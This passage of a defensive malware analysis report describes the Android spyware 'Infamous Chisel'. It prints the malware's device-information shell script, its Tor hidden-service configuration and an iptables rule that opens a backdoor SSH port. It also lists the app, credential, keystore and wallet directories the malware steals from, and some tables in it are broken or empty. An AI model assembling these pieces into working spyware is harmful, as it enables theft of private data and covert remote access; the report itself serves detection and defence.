&lt;h3&gt;netd&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;netd&lt;/code&gt; component of Infamous Chisel provides the bulk of the custom functionality which the actor deploys. The main purpose of &lt;code&gt;netd&lt;/code&gt; is to collate and exfiltrate information from the compromised device at set intervals. It uses a combination of shell scripts and commands to collect device information. It also searches multiple directories to which files matching a predefined set of extensions are exfiltrated.&lt;/p&gt;
&lt;h4&gt;Exfiltration Logic&lt;/h4&gt;


&lt;p&gt;All file exfiltration is performed as detailed in the Communications (File exfiltration)&amp;nbsp;Section of this report. Whenever a file is selected for exfiltration, it is MD5-hashed and cross-referenced with a list of previously sent file hashes held in a file at one of three locations supporting different Android versions. The first existing directory path will be used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/1/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The file exfiltration is considered complete when the server sends &lt;code&gt;Success&lt;/code&gt; anywhere in its response. As this exfiltration uses a Hypertext Transfer Protocol (HTTP) POST, this server response is also expected to be HTTP, but this is not explicitly checked for.&lt;/p&gt;
&lt;p&gt;The 16 raw bytes of the MD5 are appended to the end of the &lt;code&gt;.google.index file&lt;/code&gt;, ensuring that the same file isn’t sent multiple times. As the &lt;code&gt;.google.index&lt;/code&gt; file contains raw bytes, without prior knowledge, it would appear to contain random data. The initial allocation size is 256 Kb filled with NULLs providing space for up to a maximum of 16,384 file hashes. All hash entries will be checked for every file prior to exfiltration.&lt;/p&gt;
&lt;p&gt;When the end of the &lt;code&gt;.google.index&lt;/code&gt; file is reached, the position is reset to the start, overwriting the previous hashes. This means if the number of files to exfiltrate from the device exceeds 16,384, files will be sent multiple times.&lt;/p&gt;
&lt;h4&gt;Information Gathering&lt;/h4&gt;
&lt;p&gt;On execution, the Infamous Chisel &lt;code&gt;netd&lt;/code&gt; component enters a main loop that executes indefinitely where various timers trigger the execution of different tasks. All timer actions are executed immediately on first execution, and then at the specific intervals.&lt;/p&gt;
&lt;h5&gt;File and Device Information Exfiltration&lt;/h5&gt;
&lt;p&gt;Every 86,000 seconds (23 hours, 53 minutes, and 20 seconds) the following actions are performed:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. File exfiltration from data directories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following directories are recursively searched for files matching the extensions listed. When a file is found by this search, it is exfiltrated as detailed in the Communications (File exfiltration) Section of this report.&lt;/p&gt;
&lt;p&gt;File extension list:&lt;/p&gt;
&lt;table&gt;

&lt;/table&gt;

&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with other military specific application directories.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. Information collection script&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An information collection script collates various hardware configuration information about the device.&lt;/p&gt;
&lt;p&gt;The script is written to the location: &lt;code&gt;/data/local/tmp/.android.cache.sh&lt;/code&gt; and then executed by &lt;code&gt;netd&lt;/code&gt; using the command &lt;code&gt;/system/bin/sh -c /data/local/tmp/.android.cache.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.android.cache.sh&lt;/code&gt; contains the following shell script:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;#!/system/bin/sh&lt;/p&gt;
&lt;p&gt;system/bin/&lt;a&gt;settings get secure android_id&lt;/a&gt; &amp;gt; /data/local/tmp/.aid.cache&lt;/p&gt;
&lt;p&gt;system/bin/ip a &amp;gt; /data/local/tmp/.syscache.csv&lt;/p&gt;
&lt;p&gt;system/bin/pm list packages &amp;gt; /data/local/tmp/.syspackages.csv&lt;/p&gt;
&lt;p&gt;system/bin/getprop &amp;gt; /data/local/tmp/&lt;a&gt;.sysinfo.csv&lt;/a&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Output filename&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;settings get secure android_id&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Returns a hexadecimal string identifying the device uniquely.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.aid.cache&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;ip a&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Lists networking information such as IP address, subnet and interface type on a per network interface basis.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.syscache.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;pm list packages&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;List of installed applications on the device.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.syspackages.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;getprop&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Lists various device hardware information such as GPS, battery, manufacturer and language.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.sysinfo.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;All the information is written to the various files in the &lt;code&gt;/data/local&lt;/code&gt; directory and exfiltrated, with the exception of the &lt;code&gt;.aid.cache&lt;/code&gt; file. The &lt;code&gt;android_id&lt;/code&gt; contained within this file is used to form part of the Uniform Resource Identifier (URI) detailed in the Communications&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. File exfiltration from application directories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;/data/&lt;/code&gt; directory is searched for the application directories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.authenticator2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;free.vpn.unblock.proxy.vpnmaster&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.UCMobile.intl&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.brave.browser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.opera.browser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hisense.odinbrowser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.dzura&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.docs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sec.android.app.myfiles&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.microsoft.skydrive&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.walletnfcrel&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.paypal.android.p2pmobile&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.binance.dev&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.coinbase.android&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.wallet.crypto.trustapp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.viber.voip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.dropbox.android&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.cxinventor.file.explorer&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.elinke.fileserver&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.mozilla.firefox&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.whatsapp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.telegram.messenger.web&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.discord&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hikvisionsystems.app&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hikvision.hikconnect&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.skype.raider&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.chrome&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.chromium.webview_shell&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;keystore&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;p&gt;Every file in these directories regardless of type is exfiltrated.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Specific file exfiltration&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following files at the absolute paths are exfiltrated:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.syscache.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.syspackages.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.sysinfo.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/settings_ssaid.xml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;p&gt;The files with the extension &lt;code&gt;.csv&lt;/code&gt; are generated by the malware. The others are application specific files or system configuration information.&lt;/p&gt;
&lt;h5&gt;Exfiltration of Configuration and Configuration Backup Files&lt;/h5&gt;
&lt;p&gt;Every 600 seconds (10 minutes) the following directories are searched for files of type &lt;code&gt;.json&lt;/code&gt; or &lt;code&gt;.json.bak&lt;/code&gt; which are then immediately exfiltrated:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/media&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/de.blinkt.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/vpn.fastvpn.freevpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/eu.thedarken.wldonate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;h5&gt;Local Area Network Scanning&lt;/h5&gt;
&lt;p&gt;Every 172,000 seconds (1 day, 23 hours, 46 minutes, and 20 seconds) the local area network is scanned.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; has a built-in network scanner that is executed by the command line:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd minmap -i any -noping -o /data/local/tmp/.ndata.tmp/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The ping scanner is fairly simplistic and will iterate over the available host IP addresses in the subnet specified by the interface on all available Transmission Control Protocol (TCP) ports. Internet Control Message Protocol (ICMP) scanning is disabled due to the &lt;code&gt;noping&lt;/code&gt; command line parameter specified.&lt;/p&gt;
&lt;p&gt;The scanner also includes a HTTP GET request to elicit responses from ports running a HTTP server. The responses from other ports are also logged.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; This information would facilitate lateral movement within the network and illustrates a clear intention to interact with other nearby hosts.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;On completion of this scan, the &lt;code&gt;.ndata.tmp&lt;/code&gt; file is moved to the filename &lt;code&gt;.ndata.csv&lt;/code&gt; in the same directory. This file is exfiltrated immediately, and both files removed from the tmp directory.&lt;/p&gt;
&lt;p&gt;The contents of this file will appear similar to:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;INTERFACE = eth0&lt;/p&gt;
&lt;p&gt;SOURCE = 192.168.0.2&lt;/p&gt;
&lt;p&gt;IP begin = 192.168.0.0&lt;/p&gt;
&lt;p&gt;IP end = 192.168.0.255&lt;/p&gt;
&lt;p&gt;PORTS =&lt;/p&gt;
&lt;p&gt;PING off&lt;/p&gt;
&lt;p&gt;SCAN tcp&lt;/p&gt;
&lt;p&gt;*******start*scan********&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Host 192.168.0.0:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.1:&lt;/p&gt;
&lt;p&gt;tcp - 135:[&lt;/p&gt;
&lt;p&gt;tcp - 139:[&lt;/p&gt;
&lt;p&gt;tcp - 443:[&lt;/p&gt;
&lt;p&gt;tcp - 445:[&lt;/p&gt;
&lt;p&gt;Host 192.168.0.2:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.3:&lt;/p&gt;
&lt;p&gt;Host 192.168.0.4:&lt;/p&gt;
&lt;p&gt;&amp;lt;Remaining hosts omitted for brevity&amp;gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The following command line parameters are present, but only a small portion is used:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;-ip, -p, -o, -i, -noping, -udp, -n, -s, -t, -c, -h, --help&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Command line help is also included:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Usage minmap -ip* &amp;lt;ip-addr: 192.168.0.1/ip-range: 192.168.0.0/24&amp;gt; -p* &amp;lt;port: 80/port-range: 22,25-125/top&amp;gt; -udp &amp;lt;default tcp&amp;gt; -noping &amp;lt;default yes&amp;gt; -o &amp;lt;out_file&amp;gt; -t &amp;lt;timeout&amp;gt; &amp;lt;-n&amp;gt; -c &amp;lt;try_count&amp;gt; -s &amp;lt;source ip&amp;gt; -i &amp;lt;interface/any&amp;gt; &amp;lt;-h/--help (print this help)&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;td&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;td&lt;/code&gt; utility provides Tor directory services and is compiled for ARM with no obvious modifications. The configuration for this is generated by the &lt;code&gt;blob&lt;/code&gt; component, used for Tor management, described in the Components (blob) section, and saved at the path &lt;code&gt;/data/local/prx.cfg&lt;/code&gt;. This file contains:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;SocksPort 127.0.0.1:1129 PreferSOCKSNoAuth%sExitPolicy reject *:*&lt;/p&gt;
&lt;p&gt;DataDirectory /data/local/prx/&lt;/p&gt;
&lt;p&gt;RunAsDaemon 1&lt;/p&gt;
&lt;p&gt;HiddenServiceDir /data/local/prx/hs/&lt;/p&gt;
&lt;p&gt;HiddenServicePort 34371 127.0.0.1:34371&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;This configuration provides a Socket Secure version 4 (SOCKS4) connection on the local port &lt;code&gt;1129&lt;/code&gt; enabling the Tor network to be used. The &lt;code&gt;blob&lt;/code&gt; component uses this for network connectivity checks.&lt;/p&gt;
&lt;p&gt;The hidden service port is set to &lt;code&gt;34371&lt;/code&gt; with the directory for hidden service information being set to &lt;code&gt;/data/local/prx/hs/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;During the execution of &lt;code&gt;td&lt;/code&gt; an &lt;code&gt;.onion&lt;/code&gt; domain for a hidden service is randomly generated at the path &lt;code&gt;/data/local/prx/hs/hostname&lt;/code&gt; which is then exfiltrated by &lt;code&gt;netd&lt;/code&gt;. The &lt;code&gt;db&lt;/code&gt; component performs further configuration detailed in the Multi-call binaries (Watchdog)&amp;nbsp;section of this report to enable a SSH connection via this &lt;code&gt;.onion&lt;/code&gt; domain. This gives the actor the ability to create an SSH session by connecting to the hidden service across Tor.&lt;/p&gt;
&lt;h3&gt;blob&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;blob&lt;/code&gt; component is responsible for configuring Tor services and checking network connectivity. Every 15 seconds the &lt;code&gt;tmp&lt;/code&gt; directory is checked for the &lt;code&gt;blob&lt;/code&gt; utility, and if found, it is moved to the &lt;code&gt;/data/local&lt;/code&gt; directory from the &lt;code&gt;/data/local/tmp/blob&lt;/code&gt; directory, overwriting any existing version. Every 6,000 seconds (1 hour and 40 minutes) &lt;code&gt;blob&lt;/code&gt; is then run from the &lt;code&gt;/data/local&lt;/code&gt; directory.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; executes &lt;code&gt;blob&lt;/code&gt; which is responsible for configuring and executing Tor services provided by &lt;code&gt;td&lt;/code&gt;. When run, it performs the following actions:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Checks local host for the port &lt;code&gt;1129&lt;/code&gt; being open, exiting if it is.&lt;/li&gt;
&lt;li&gt;Checks for the existence of &lt;code&gt;/data/local/td&lt;/code&gt;. If this is not present, extracts it from &lt;code&gt;/data/local/td.bz2&lt;/code&gt; (bzip2 compressed data).&lt;/li&gt;
&lt;li&gt;Creates the configuration file at the path: &lt;code&gt;/data/local/prx.cfg&lt;/code&gt;.&amp;nbsp;The contents of which are detailed in the Components (td)&amp;nbsp;section above.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;td&lt;/code&gt; is executed with this configuration file being supplied with the &lt;code&gt;-f&lt;/code&gt; command line parameter: &lt;code&gt;/data/local/td -f /data/local/prx.cfg&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;db&lt;/code&gt; the modified Dropbear SSH utility is checked for at the path &lt;code&gt;/data/local/db&lt;/code&gt;. If this file is not present, it is extracted from &lt;code&gt;/data/local/db.bz2&lt;/code&gt;. db is then executed immediately after, with no command line parameters being passed.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;blob&lt;/code&gt; then enters a loop where it performs a network connectivity check against the domain &lt;code&gt;www.geodatatool[.]com&lt;/code&gt; connecting on the local SOCKS4 address provided by the td utility &lt;code&gt;127.0.0[.]1:1129&lt;/code&gt; every 3 minutes.&lt;/li&gt;
&lt;li&gt;It checks the second byte of the response from this domain to be the character &lt;code&gt;Z (0x5a)&lt;/code&gt; to validate a legitimate response has been received from the server. Nothing further is done with the data; this is simply an internet connection check.&lt;/li&gt;
&lt;li&gt;If this request fails or the server doesn’t return the expected data, &lt;code&gt;blob&lt;/code&gt; terminates the execution of &lt;code&gt;td&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;tcpdump&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;tcpdump&lt;/code&gt; utility (version &lt;code&gt;4.1.1&lt;/code&gt;) is compiled for ARM with no obvious modifications. This provides traffic capturing and monitoring functionality via the command line.&lt;/p&gt;
&lt;h3&gt;Multi-call binaries: db, NDBR_armv7l and NDBR_i686&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;db&lt;/code&gt; utility contains multiple individual utilities which are selected based on the command line parameters supplied:&lt;/p&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Utility&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Actor&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Modified&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;dropbear&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;No&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Yes&lt;/p&gt;
&lt;/td&gt;

&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;dropbearkey&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;No&lt;/p&gt;
&lt;/td&gt;

&lt;/td&gt;
&lt;/tr&gt;

&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Yes&lt;/p&gt;

&lt;p&gt;No&lt;/p&gt;

&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Yes&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;N/A&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Creates directories&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The command line help for &lt;code&gt;dropbear&lt;/code&gt;, &lt;code&gt;dropbearkey&lt;/code&gt;, &lt;code&gt;nmap&lt;/code&gt; and &lt;code&gt;scp&lt;/code&gt; can be found in the Appendix&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dropbear&lt;/code&gt;, present within &lt;code&gt;db&lt;/code&gt;, provides secure shell access to the device via the Tor hidden service. IP Tables rules configured allow incoming TCP connections destined for port &lt;code&gt;34371&lt;/code&gt; through the firewall. The Tor utility executed by &lt;code&gt;blob&lt;/code&gt; on the device is configured to provide a hidden service on this port, then forward connections to the local &lt;code&gt;dropbear&lt;/code&gt; instance. The &lt;code&gt;.onion&lt;/code&gt; address has already been exfiltrated enabling the actor to connect to it. Modifications have been made to &lt;code&gt;dropbear&lt;/code&gt; authentication mechanisms.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;scp&lt;/code&gt; utility does not appear to have been modified. The &lt;code&gt;nmap&lt;/code&gt; utility has the same functionality as the version in &lt;code&gt;netd&lt;/code&gt; but is executed manually by actor interaction.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;watchdog&lt;/code&gt;, &lt;code&gt;rmflag&lt;/code&gt;, and &lt;code&gt;mkflag&lt;/code&gt; utilities appear to be additional actor-created code that has been incorporated to perform some configuration for &lt;code&gt;dropbear&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The directory &lt;code&gt;sessions.log.d&lt;/code&gt; is created under &lt;code&gt;/data/local/tmp/&lt;/code&gt;, and puts all standard Dropbear files under this directory alongside the custom actor file &lt;code&gt;remove_file.flag&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;Watchdog&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;watchdog&lt;/code&gt; utility performs setup and executes &lt;code&gt;dropbear&lt;/code&gt;. This setup includes:&lt;/p&gt;
&lt;h5&gt;File and directory creation&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/remove_file.flag&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The &lt;code&gt;remove_file.flag&lt;/code&gt;&amp;nbsp;file is created containing the string &lt;code&gt;run&lt;/code&gt; when any of the multi-call utilities run Dropbear. This will be collected and exfiltrated by&amp;nbsp;&lt;code&gt;netd&lt;/code&gt;&amp;nbsp;giving the actor an indicator that the SSH server is active.&lt;/p&gt;
&lt;h5&gt;Authorized hosts setup&lt;/h5&gt;
&lt;p&gt;A host key is placed into the directory:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/authorized_keys&lt;/code&gt;&lt;/p&gt;
&lt;h5&gt;IP Tables Rules&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;/usr/sbin/iptables&lt;/code&gt; is executed with the parameters:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-A INPUT -p tcp --dport 34371 -j ACCEPT -I&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;mkflag&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;mkflag&lt;/code&gt; utility creates the directories and files that &lt;code&gt;watchdog&lt;/code&gt; creates but does not perform any host file or IP table manipulation, and then runs &lt;code&gt;dropbear&lt;/code&gt;.&lt;/p&gt;
&lt;h4&gt;rmflag&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;rmflag&lt;/code&gt; utility deletes &lt;code&gt;/data/local/tmp/sessions.log.d/.ssh/remove_file.flag&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;Modified Dropbear functions&lt;/h4&gt;
&lt;p&gt;The actor has modified authentication mechanisms in Dropbear.&lt;/p&gt;
&lt;h5&gt;fill_passwd&lt;/h5&gt;
&lt;p&gt;The Dropbear function &lt;code&gt;fill_passwd&lt;/code&gt; is used to verify that a supplied username is a valid account and return information required to process authentication.&lt;/p&gt;
&lt;p&gt;The unmodified source code for this can be found in the Appendix (Dropbear fill_passwd function)&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;This function calls multiple Linux library functions, &lt;code&gt;getpwnam&lt;/code&gt;, &lt;code&gt;getspnam&lt;/code&gt;, &lt;code&gt;getpwuid&lt;/code&gt;, but in the modified version actor replacement functions are called instead, each of these are discussed below.&lt;/p&gt;
&lt;h5&gt;getpwnam&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getpwnam&lt;/code&gt; Linux library function accepts a username and cross-references it with the passwd file usually stored at &lt;code&gt;/etc/passwd&lt;/code&gt; for the corresponding entry containing the colon concatenated fields:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;username&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user password&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user ID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;group ID&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;user information&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;home directory&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shell program&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
